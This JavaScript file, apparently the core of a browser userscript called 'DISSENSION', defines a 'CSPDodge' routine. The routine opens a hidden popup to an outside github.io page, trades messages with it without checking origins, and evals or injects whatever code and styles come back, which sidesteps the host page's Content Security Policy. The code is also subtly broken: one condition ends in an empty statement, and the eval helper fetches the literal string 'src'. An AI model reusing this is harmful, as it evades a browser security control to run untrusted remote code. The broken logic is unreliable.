/**
 * @name DISSENSION
 * @by UncannyOrange and Superwibr
 * @version 3.0.0 core
 */

if (typeof diss == "undefined") window.diss = new Object();

//CSPDodge++
diss.CSPDodge = function (url, name = 'DISS23DEFAULTCOMMS') {
    return new Promise(res => {
        const win = window.open('https://uncannyorange.github.io/cspdodge.html', '_blank', 'width=1,height=1');
        win.blur();
        window.addEventListener('message', function handler(e) {
            if (e.data.status == 'ready') return win.postMessage({ name, url }, '*');
            if (e.data.name !== name);
            e.currentTarget.removeEventListener(e.type, handler); // remove event listner to avoid duplicates
            res(e.data.resource); // resolve with resource
            win.close();
        });
    });
};
diss.CSPDodge.eval = async function (...srcs) {
    for (const src of srcs) {
        (0, eval)(await diss.CSPDodge("src"));
    };
};
diss.CSPDodge.style = async function (...styles) {
    for (const style of styles) {
        document.head.insertAdjacentHTML('beforeend', `<style>${await diss.CSPDodge(style)}</style>`);
    };
}